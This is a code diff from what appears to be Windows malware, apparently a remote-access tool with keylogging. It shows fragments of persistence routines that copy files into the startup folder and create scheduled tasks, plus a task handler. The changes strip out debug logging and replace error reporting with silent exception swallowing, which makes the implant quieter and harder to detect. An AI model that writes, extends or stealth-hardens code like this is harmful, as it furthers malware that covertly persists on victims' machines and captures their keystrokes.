@@ -195,9 +195,7 @@ def establish_persistence():
                 pass
         
     except Exception as e:
-        if DEBUG_MODE:
-            logging.error(f"File copy failed: {e}")
-    
+        pass
     # Startup folder backup method
     if not success:
         try:
@@ -220,12 +218,10 @@ def establish_persistence():
                     with open(startup_path, "wb") as f:
                         f.write(data)
                 success = True
-                if DEBUG_MODE:
-                    logging.info(f"Startup folder persistence: {startup_path}")
+                
         except Exception as e:
-            if DEBUG_MODE:
-                logging.error(f"Startup folder failed: {e}")
-    
+            pass
+            
     # Task Scheduler method (additional persistence)
     if success:
         try:
@@ -300,11 +296,8 @@ def create_scheduled_task(task_name, exe_path):
         # Clean up
         os.remove(temp_xml)
         
-        if DEBUG_MODE:
-            logging.info(f"Scheduled task created: {task_name}")
     except Exception as e:
-        if DEBUG_MODE:
-            logging.error(f"Scheduled task failed: {e}")
+        pass
 
 # ===================== TASK HANDLERS =====================
 keylog_buffer = []
@@ -1430,6 +1423,7 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
 
 
 
